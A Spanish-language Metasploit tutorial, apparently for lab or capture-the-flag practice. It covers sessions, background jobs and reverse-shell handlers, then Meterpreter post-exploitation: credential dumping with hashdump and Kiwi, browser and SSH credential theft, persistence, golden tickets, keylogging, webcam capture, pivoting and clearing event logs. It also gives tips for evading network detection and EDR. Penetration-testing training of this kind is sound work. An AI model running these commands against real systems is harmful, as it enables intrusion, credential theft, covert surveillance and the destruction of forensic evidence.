# Sesiones, Jobs y Meterpreter

### Sessions y Jobs

#### Sesiones

Cada vez que Metasploit establece un acceso a un sistema (Meterpreter, shell, VNC...) se crea una **sesión**. Las sesiones permiten gestionar múltiples accesos simultáneos.

```bash
# Listar sesiones activas
sessions
sessions -l

# Salida típica:
# Active sessions
# ===============
#   Id  Name  Type                     Information                Connection
#   --  ----  ----                     -----------                ----------
#   1         meterpreter x64/windows  EMPRESA\admin @ WS01      10.10.14.5:443 -> 10.10.10.10:49215
#   2         shell linux               www-data @ webserver       10.10.14.5:4444 -> 10.10.10.15:42891

# Interactuar con una sesión
sessions -i 1

# Poner la sesión activa en background
background
# o Ctrl+Z

# Renombrar una sesión
sessions -n "DC01_SYSTEM" -i 1

# Actualizar una sesión de shell a Meterpreter
sessions -u 2
# Convierte una shell básica en Meterpreter si es posible

# Matar una sesión
sessions -k 1
sessions -K    # matar todas

# Ejecutar un comando en todas las sesiones
sessions -c "getuid"

# Ejecutar un script de Meterpreter en todas las sesiones
sessions -s post/multi/manage/shell_to_meterpreter
```

#### Jobs

Los jobs son módulos corriendo en background — principalmente listeners (handlers) que esperan conexiones entrantes.

```bash
# Ver jobs activos
jobs
jobs -l

# Lanzar un exploit como job en background
msf6 > exploit -j

# Salida:
# [*] Exploit running as background job 0.
# [*] Started reverse TCP handler on 10.10.14.5:443

# Matar un job
jobs -k 0
jobs -K    # matar todos

# Ver información detallada de un job
jobs -i 0
```

#### Configurar un listener persistente (handler)

El handler multi/handler recibe conexiones de cualquier payload generado con MSFvenom:

```bash
msf6 > use multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 443

# Opciones avanzadas del handler
msf6 > set ExitOnSession false    # no matar el handler al recibir la primera sesión
msf6 > set SessionCommunicationTimeout 0  # no timeout en la sesión

# Lanzar en background para recibir múltiples conexiones
msf6 > exploit -j

# Cuando llegue una sesión:
# [*] Meterpreter session 1 opened
```

### Meterpreter

Meterpreter es el payload avanzado de Metasploit. Usa **inyección DLL en memoria** — el agente se ejecuta completamente en RAM sin escribirse en disco, lo que lo hace más sigiloso que una shell convencional. La comunicación está **cifrada con TLS**.

#### Comandos de sistema

```bash
# Información básica
getuid              # usuario actual
getpid              # PID del proceso de Meterpreter
sysinfo             # información del sistema (OS, hostname, arquitectura)
getenv              # variables de entorno

# Navegación del sistema de archivos
pwd                 # directorio actual
ls                  # listar contenido
cd C:\\Users        # cambiar directorio
cat archivo.txt     # leer archivo
edit archivo.txt    # editar archivo con editor integrado
mkdir directorio    # crear directorio
rm archivo.txt      # eliminar archivo
mv origen destino   # mover/renombrar

# Transferencia de archivos
upload /local/nc.exe C:\\Windows\\Temp\\nc.exe
download C:\\Users\\Admin\\Desktop\\flag.txt /tmp/
```

#### Escalada de privilegios

```bash
# Ver privilegios actuales
getprivs

# Intentar obtener privilegios de SYSTEM
getsystem
# Prueba múltiples técnicas: Named Pipe Impersonation, Token Duplication...

# Ver si somos SYSTEM
getuid
# Server username: NT AUTHORITY\SYSTEM

# Migrar a otro proceso (para estabilidad o evasión)
ps                  # listar procesos
migrate 1234        # migrar al PID 1234

# Migrar a un proceso estable (ej: explorer.exe, svchost.exe)
migrate -N explorer.exe    # migrar por nombre
```

#### Enumeración del sistema

```bash
# Procesos en ejecución
ps
pgrep svchost        # buscar proceso por nombre

# Conexiones de red activas
portfwd              # port forwarding
route                # tabla de rutas

# Variables de entorno
env

# Información del sistema detallada
run post/windows/gather/enum_system
run post/linux/gather/enum_system
```

#### Credenciales y dump

```bash
# Dump de hashes del SAM local (requiere SYSTEM)
hashdump

# Equivalente con módulo post
run post/windows/gather/hashdump

# Dump de credenciales en memoria con Kiwi (Mimikatz integrado)
load kiwi
creds_all             # dump de todas las credenciales
lsa_dump_sam          # hashes del SAM
lsa_dump_secrets      # secretos LSA
wifi_list             # contraseñas WiFi guardadas

# Sin Kiwi — usando módulo post
run post/windows/gather/credentials/credential_collector
```

#### Persistencia

```bash
# Módulos de persistencia
run post/windows/manage/persistence_exe   # ejecutable en startup
run post/windows/manage/persistence       # servicio o registry

# Crear tarea programada
run post/windows/manage/scheduled_task

# Golden Ticket (requiere hash de krbtgt)
# Desde Kiwi:
golden_ticket_create -d empresa.local -k KRBTGT_HASH -s SID -u FakeAdmin
kerberos_ticket_use ticket.kirbi
```

#### Pivoting y port forwarding

```bash
# Añadir ruta para llegar a una red interna a través del host comprometido
route add 192.168.2.0/24 1    # 1 = session ID

# Port forwarding local → objetivo (acceder a un servicio interno)
portfwd add -l 8080 -p 80 -r 192.168.2.100
# -l: puerto local del atacante
# -p: puerto remoto del objetivo
# -r: IP del objetivo interno

portfwd list     # ver forwards activos
portfwd delete -l 8080

# Proxy SOCKS para usar herramientas externas a través de la sesión
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j
# Configurar proxychains para usar 127.0.0.1:1080
```

#### Gestión de la shell

```bash
# Caer a una shell del sistema operativo
shell

# Volver a Meterpreter desde la shell
exit    # o Ctrl+Z

# Ejecutar un comando único sin abrir shell
execute -f cmd.exe -a "/c whoami"
execute -H -f cmd.exe -a "/c whoami"    # -H = oculto (sin ventana)

# Captura de pantalla del escritorio
screenshot

# Keylogger
keyscan_start    # iniciar captura de pulsaciones
keyscan_dump     # volcar lo capturado
keyscan_stop     # detener

# Webcam (si está disponible)
webcam_list
webcam_snap      # capturar foto
```

#### Módulos post de Meterpreter

```bash
# Enumeración
run post/multi/recon/local_exploit_suggester    # sugerir exploits de escalada
run post/windows/gather/enum_logged_on_users    # usuarios con sesión
run post/windows/gather/enum_shares             # shares de red
run post/windows/gather/enum_applications       # aplicaciones instaladas
run post/windows/gather/checkvm                 # detectar si es VM

# Recolección de credenciales
run post/windows/gather/credentials/chrome      # credenciales de Chrome
run post/windows/gather/credentials/firefox     # credenciales de Firefox
run post/multi/gather/ssh_creds                 # claves SSH

# Escalada de privilegios
run post/multi/recon/local_exploit_suggester    # listar posibles exploits locales

# Limpieza
clearev    # limpiar los event logs de Windows
```

### Tipos de Meterpreter

Meterpreter tiene variantes según la plataforma y el protocolo de comunicación:

| Payload                                 | Uso                               |
| --------------------------------------- | --------------------------------- |
| `windows/meterpreter/reverse_tcp`       | Windows x86, TCP                  |
| `windows/x64/meterpreter/reverse_tcp`   | Windows x64, TCP                  |
| `windows/x64/meterpreter/reverse_https` | Windows x64, HTTPS (más sigiloso) |
| `linux/x64/meterpreter/reverse_tcp`     | Linux x64, TCP                    |
| `linux/x64/meterpreter_reverse_http`    | Linux x64, HTTP stageless         |
| `java/meterpreter/reverse_tcp`          | Java (multi-plataforma)           |
| `php/meterpreter/reverse_tcp`           | PHP (para webshells)              |
| `android/meterpreter/reverse_tcp`       | Android                           |

> Usar `meterpreter/reverse_https` en lugar de `reverse_tcp` hace que el tráfico de C2 sea indistinguible del tráfico HTTPS normal desde el punto de vista de la red, dificultando la detección basada en tráfico.

> `getsystem` intenta múltiples técnicas de escalada de privilegios. En entornos con EDR activo, estas técnicas pueden ser detectadas. Verificar siempre qué privilegios tiene el usuario antes de lanzarlo para no generar ruido innecesario.
